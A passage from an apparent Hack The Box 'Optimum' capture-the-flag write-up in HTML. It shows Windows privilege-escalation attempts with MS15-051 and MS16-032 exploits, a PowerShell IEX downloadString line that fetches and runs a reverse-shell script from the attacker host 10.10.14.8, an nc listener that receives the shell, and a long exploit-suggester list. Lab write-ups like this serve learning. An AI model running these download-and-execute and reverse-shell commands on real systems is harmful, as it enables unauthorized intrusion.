+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>  <span class="ex">---</span> no response <span class="at">---</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\tmp</span><span class="op">&gt;</span> //10.10.14.8/pub-share/ms15-051x64.exe</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[#]</span> ms15-051 fixed by zcgonvh</span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[#]</span> usage: ms15-051 command</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[#]</span> eg: ms15-051 <span class="st">"whoami /all"</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\tmp</span><span class="op">&gt;</span> //10.10.14.8/pub-share/ms15-051x64.exe <span class="st">"whoami"</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>  <span class="ex">---</span> no response <span class="at">---</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="ms16-032" class="level3">
+<h3 class="anchored" data-anchor-id="ms16-032">MS16-032:</h3>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\tmp</span><span class="op">&gt;</span> //10.10.14.8/pub-share/ms16-032.exe</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Gathering</span> thread handles</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Done,</span> got 3 handles</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="ex">System</span> Token: 0000000000000158</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Couldn</span><span class="st">'t open process token 5</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="st">The .exe doesn'</span><span class="ex">t</span> work, so lets try the .ps1:</span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\tmp</span><span class="op">&gt;</span> powershell.exe IEX<span class="er">(</span><span class="ex">New-Object</span> Net.Webclient<span class="kw">)</span><span class="ex">.downloadString</span><span class="er">(</span><span class="st">'http://10.10.14.8/ps-rev.ps1'</span><span class="kw">)</span></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/srv/pub-share]#</span> python3 <span class="at">-m</span> http.server 80</span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er">(</span><span class="ex">http://0.0.0.0:80/</span><span class="kw">)</span> <span class="ex">...</span></span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>  <span class="ex">10.10.10.8</span> <span class="at">-</span> <span class="at">-</span> [02/Mar/2021 12:46:07] <span class="st">"GET /ps-rev.ps1 HTTP/1.1"</span> 200 <span class="at">-</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/optimum]#</span> rlwrap nc <span class="at">-lvnp</span> 4488                                                                                     <span class="er">(</span><span class="ex">master✱</span><span class="kw">)</span></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>  <span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4488 ...</span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>  <span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.8</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.10.8]</span> 49259</span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a>  <span class="ex">PS</span> C:<span class="dt">\U</span>sers<span class="dt">\k</span>ostas<span class="dt">\D</span>esktop<span class="op">&gt;</span> whoami</span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a>    <span class="ex">optimum\kostas</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><strong>Summary:</strong> - ms15-051 - nope - ms15-076 - nope - ms15-078 - not checked - ms16-032 - nope - ms16-034 - not checked</p>
+<p>The exploits found by Watson doesn’t seem to give anything, so lets go back one step and try windows-expoit-suggester instead.</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/srv/pub-share]#</span> python /opt/windows-exploit-suggester.py <span class="at">--update</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>  <span class="ex">[*]</span> initiating winsploit version 3.3...</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>  <span class="ex">[+]</span> writing to file 2021-03-02-mssb.xls</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>  <span class="ex">[*]</span> done</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/optimum]#</span> python /opt/windows-exploit-suggester.py <span class="at">--database</span> 2021-03-02-mssb.xls <span class="at">--systeminfo</span> systeminfo.txt      <span class="er">(</span><span class="ex">master✱</span><span class="kw">)</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> initiating winsploit version 3.3...</span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> database file detected as xls or xlsx based on extension</span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> attempting to read from the systeminfo input file</span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> systeminfo input file read successfully <span class="er">(</span><span class="ex">utf-8</span><span class="kw">)</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> querying database file for potential vulnerabilities</span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> comparing the 32 hotfix<span class="er">(</span><span class="ex">es</span><span class="kw">)</span> <span class="ex">against</span> the 266 potential bulletins<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">with</span> a database of 137 known exploits</span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> there are now 246 remaining vulns</span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> <span class="pp">[</span><span class="ss">E</span><span class="pp">]</span> exploitdb PoC, <span class="pp">[</span><span class="ss">M</span><span class="pp">]</span> Metasploit module, <span class="pp">[</span><span class="ss">*</span><span class="pp">]</span> missing bulletin</span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> windows version identified as <span class="st">'Windows 2012 R2 64-bit'</span></span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS16-135: Security Update for Windows Kernel-Mode Drivers <span class="er">(</span><span class="ex">3199135</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/40745/ <span class="at">--</span> Microsoft Windows Kernel <span class="at">-</span> win32k Denial of Service <span class="er">(</span><span class="ex">MS16-135</span><span class="kw">)</span></span>
+<span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/41015/ <span class="at">--</span> Microsoft Windows Kernel <span class="at">-</span> <span class="st">'win32k.sys'</span> <span class="st">'NtSetWindowLongPtr'</span> Privilege Escalation <span class="er">(</span><span class="ex">MS16-135</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">2</span><span class="kw">)</span></span>
+<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://github.com/tinysec/public/tree/master/CVE-2016-7255</span>
+<span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS16-098: Security Update for Windows Kernel-Mode Drivers <span class="er">(</span><span class="ex">3178466</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/41020/ <span class="at">--</span> Microsoft Windows 8.1 <span class="er">(</span><span class="ex">x64</span><span class="kw">)</span> <span class="ex">-</span> RGNOBJ Integer Overflow <span class="er">(</span><span class="ex">MS16-098</span><span class="kw">)</span></span>
+<span id="cb12-24"><a href="#cb12-24" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-25"><a href="#cb12-25" aria-hidden="true" tabindex="-1"></a><span class="ex">[M]</span> MS16-075: Security Update for Windows SMB Server <span class="er">(</span><span class="ex">3164038</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-26"><a href="#cb12-26" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://github.com/foxglovesec/RottenPotato</span>
+<span id="cb12-27"><a href="#cb12-27" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://github.com/Kevin-Robertson/Tater</span>
+<span id="cb12-28"><a href="#cb12-28" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://bugs.chromium.org/p/project-zero/issues/detail<span class="pp">?</span>id=222 <span class="at">--</span> Windows: Local WebDAV NTLM Reflection Elevation of Privilege</span>
+<span id="cb12-29"><a href="#cb12-29" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://foxglovesecurity.com/2016/01/16/hot-potato/ <span class="at">--</span> Hot Potato <span class="at">-</span> Windows Privilege Escalation</span>
+<span id="cb12-30"><a href="#cb12-30" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-31"><a href="#cb12-31" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS16-074: Security Update for Microsoft Graphics Component <span class="er">(</span><span class="ex">3164036</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-32"><a href="#cb12-32" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39990/ <span class="at">--</span> Windows <span class="at">-</span> gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure <span class="er">(</span><span class="ex">MS16-074</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-33"><a href="#cb12-33" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39991/ <span class="at">--</span> Windows Kernel <span class="at">-</span> ATMFD.DLL NamedEscape 0x250C Pool Corruption <span class="er">(</span><span class="ex">MS16-074</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-34"><a href="#cb12-34" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-35"><a href="#cb12-35" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS16-063: Cumulative Security Update for Internet Explorer <span class="er">(</span><span class="ex">3163649</span><span class="kw">)</span> <span class="ex">-</span> Critical</span>
+<span id="cb12-36"><a href="#cb12-36" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39994/ <span class="at">--</span> Internet Explorer 11 <span class="at">-</span> Garbage Collector Attribute Type Confusion <span class="er">(</span><span class="ex">MS16-063</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-37"><a href="#cb12-37" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-38"><a href="#cb12-38" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS16-032: Security Update for Secondary Logon to Address Elevation of Privile <span class="er">(</span><span class="ex">3143141</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-39"><a href="#cb12-39" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/40107/ <span class="at">--</span> MS16-032 Secondary Logon Handle Privilege Escalation, MSF</span>
+<span id="cb12-40"><a href="#cb12-40" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39574/ <span class="at">--</span> Microsoft Windows 8.1/10 <span class="at">-</span> Secondary Logon Standard Handles Missing Sanitization Privilege Escalation <span class="er">(</span><span class="ex">MS16-032</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-41"><a href="#cb12-41" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39719/ <span class="at">--</span> Microsoft Windows 7-10 <span class="kw">&amp;</span> <span class="ex">Server</span> 2008-2012 <span class="er">(</span><span class="ex">x32/x64</span><span class="kw">)</span> <span class="ex">-</span> Local Privilege Escalation <span class="er">(</span><span class="ex">MS16-032</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">PowerShell</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-42"><a href="#cb12-42" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39809/ <span class="at">--</span> Microsoft Windows 7-10 <span class="kw">&amp;</span> <span class="ex">Server</span> 2008-2012 <span class="er">(</span><span class="ex">x32/x64</span><span class="kw">)</span> <span class="ex">-</span> Local Privilege Escalation <span class="er">(</span><span class="ex">MS16-032</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">C#</span><span class="kw">)</span></span>
+<span id="cb12-43"><a href="#cb12-43" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-44"><a href="#cb12-44" aria-hidden="true" tabindex="-1"></a><span class="ex">[M]</span> MS16-016: Security Update for WebDAV to Address Elevation of Privilege <span class="er">(</span><span class="ex">3136041</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-45"><a href="#cb12-45" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/40085/ <span class="at">--</span> MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF</span>
+<span id="cb12-46"><a href="#cb12-46" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39788/ <span class="at">--</span> Microsoft Windows 7 <span class="at">-</span> WebDAV Privilege Escalation Exploit <span class="er">(</span><span class="ex">MS16-016</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">2</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-47"><a href="#cb12-47" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39432/ <span class="at">--</span> Microsoft Windows 7 SP1 x86 <span class="at">-</span> WebDAV Privilege Escalation <span class="er">(</span><span class="ex">MS16-016</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">1</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-48"><a href="#cb12-48" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-49"><a href="#cb12-49" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution <span class="er">(</span><span class="ex">3134228</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-50"><a href="#cb12-50" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   Windows 7 SP1 x86 <span class="at">-</span> Privilege Escalation <span class="er">(</span><span class="ex">MS16-014</span><span class="kw">)</span><span class="ex">,</span> https://www.exploit-db.com/exploits/40039/, PoC</span>
+<span id="cb12-51"><a href="#cb12-51" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-52"><a href="#cb12-52" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution <span class="er">(</span><span class="ex">3124901</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-53"><a href="#cb12-53" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39232/ <span class="at">--</span> Microsoft Windows devenum.dll!DeviceMoniker::Load<span class="er">(</span><span class="kw">)</span> <span class="ex">-</span> Heap Corruption Buffer Underflow <span class="er">(</span><span class="ex">MS16-007</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-54"><a href="#cb12-54" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39233/ <span class="at">--</span> Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll <span class="er">(</span><span class="ex">MS-16-007</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-55"><a href="#cb12-55" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-56"><a href="#cb12-56" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution <span class="er">(</span><span class="ex">3116162</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-57"><a href="#cb12-57" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/38968/ <span class="at">--</span> Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll <span class="er">(</span><span class="ex">MS15-132</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-58"><a href="#cb12-58" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/38918/ <span class="at">--</span> Microsoft Office / COM Object els.dll DLL Planting <span class="er">(</span><span class="ex">MS15-134</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-59"><a href="#cb12-59" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-60"><a href="#cb12-60" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS15-112: Cumulative Security Update for Internet Explorer <span class="er">(</span><span class="ex">3104517</span><span class="kw">)</span> <span class="ex">-</span> Critical</span>
+<span id="cb12-61"><a href="#cb12-61" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39698/ <span class="at">--</span> Internet Explorer 9/10/11 <span class="at">-</span> CDOMStringDataList::InitFromString Out-of-Bounds Read <span class="er">(</span><span class="ex">MS15-112</span><span class="kw">)</span></span>
+<span id="cb12-62"><a href="#cb12-62" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-63"><a href="#cb12-63" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege <span class="er">(</span><span class="ex">3096447</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-64"><a href="#cb12-64" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/38474/ <span class="at">--</span> Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass <span class="er">(</span><span class="ex">MS15-111</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-65"><a href="#cb12-65" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-66"><a href="#cb12-66" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege <span class="er">(</span><span class="ex">3089657</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-67"><a href="#cb12-67" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/38202/ <span class="at">--</span> Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC</span>
+<span id="cb12-68"><a href="#cb12-68" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/38200/ <span class="at">--</span> Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC</span>
+<span id="cb12-69"><a href="#cb12-69" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/38201/ <span class="at">--</span> Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC</span>
+<span id="cb12-70"><a href="#cb12-70" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-71"><a href="#cb12-71" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution <span class="er">(</span><span class="ex">3089656</span><span class="kw">)</span> <span class="ex">-</span> Critical</span>
+<span id="cb12-72"><a href="#cb12-72" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/38198/ <span class="at">--</span> Windows 10 Build 10130 <span class="at">-</span> User Mode Font Driver Thread Permissions Privilege Escalation, PoC</span>
+<span id="cb12-73"><a href="#cb12-73" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/38199/ <span class="at">--</span> Windows NtUserGetClipboardAccessToken Token Leak, PoC</span>
+<span id="cb12-74"><a href="#cb12-74" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-75"><a href="#cb12-75" aria-hidden="true" tabindex="-1"></a><span class="ex">[M]</span> MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution <span class="er">(</span><span class="ex">3079904</span><span class="kw">)</span> <span class="ex">-</span> Critical</span>
+<span id="cb12-76"><a href="#cb12-76" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/38222/ <span class="at">--</span> MS15-078 Microsoft Windows Font Driver Buffer Overflow</span>
+<span id="cb12-77"><a href="#cb12-77" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-78"><a href="#cb12-78" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass <span class="er">(</span><span class="ex">3050514</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-79"><a href="#cb12-79" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/37052/ <span class="at">--</span> Windows <span class="at">-</span> CNG.SYS Kernel Security Feature Bypass PoC <span class="er">(</span><span class="ex">MS15-052</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-80"><a href="#cb12-80" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-81"><a href="#cb12-81" aria-hidden="true" tabindex="-1"></a><span class="ex">[M]</span> MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class="er">(</span><span class="ex">3057191</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-82"><a href="#cb12-82" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC</span>
+<span id="cb12-83"><a href="#cb12-83" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/37367/ <span class="at">--</span> Windows ClientCopyImage Win32k Exploit, MSF</span>
+<span id="cb12-84"><a href="#cb12-84" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-85"><a href="#cb12-85" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution <span class="er">(</span><span class="ex">3036220</span><span class="kw">)</span> <span class="ex">-</span> Critical</span>
+<span id="cb12-86"><a href="#cb12-86" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39035/ <span class="at">--</span> Microsoft Windows 8.1 <span class="at">-</span> win32k Local Privilege Escalation <span class="er">(</span><span class="ex">MS15-010</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-87"><a href="#cb12-87" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/37098/ <span class="at">--</span> Microsoft Windows <span class="at">-</span> Local Privilege Escalation <span class="er">(</span><span class="ex">MS15-010</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-88"><a href="#cb12-88" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/39035/ <span class="at">--</span> Microsoft Windows win32k Local Privilege Escalation <span class="er">(</span><span class="ex">MS15-010</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-89"><a href="#cb12-89" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-90"><a href="#cb12-90" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege <span class="er">(</span><span class="ex">3023266</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-91"><a href="#cb12-91" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   http://www.exploit-db.com/exploits/35661/ <span class="at">--</span> Windows 8.1 <span class="er">(</span><span class="ex">32/64</span> bit<span class="kw">)</span> <span class="ex">-</span> Privilege Escalation <span class="er">(</span><span class="ex">ahcache.sys/NtApphelpCacheControl</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-92"><a href="#cb12-92" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-93"><a href="#cb12-93" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege <span class="er">(</span><span class="ex">3011780</span><span class="kw">)</span> <span class="ex">-</span> Critical</span>
+<span id="cb12-94"><a href="#cb12-94" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   http://www.exploit-db.com/exploits/35474/ <span class="at">--</span> Windows Kerberos <span class="at">-</span> Elevation of Privilege <span class="er">(</span><span class="ex">MS14-068</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-95"><a href="#cb12-95" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-96"><a href="#cb12-96" aria-hidden="true" tabindex="-1"></a><span class="ex">[M]</span> MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution <span class="er">(</span><span class="ex">3011443</span><span class="kw">)</span> <span class="ex">-</span> Critical</span>
+<span id="cb12-97"><a href="#cb12-97" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   https://www.exploit-db.com/exploits/37800// <span class="at">--</span> Microsoft Windows HTA <span class="er">(</span><span class="ex">HTML</span> Application<span class="kw">)</span> <span class="ex">-</span> Remote Code Execution <span class="er">(</span><span class="ex">MS14-064</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-98"><a href="#cb12-98" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   http://www.exploit-db.com/exploits/35308/ <span class="at">--</span> Internet Explorer OLE Pre-IE11 <span class="at">-</span> Automation Array Remote Code Execution / Powershell VirtualAlloc <span class="er">(</span><span class="ex">MS14-064</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-99"><a href="#cb12-99" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   http://www.exploit-db.com/exploits/35229/ <span class="at">--</span> Internet Explorer <span class="op">&lt;</span>= 11 <span class="at">-</span> OLE Automation Array Remote Code Execution <span class="er">(</span><span class="co">#1), PoC</span></span>
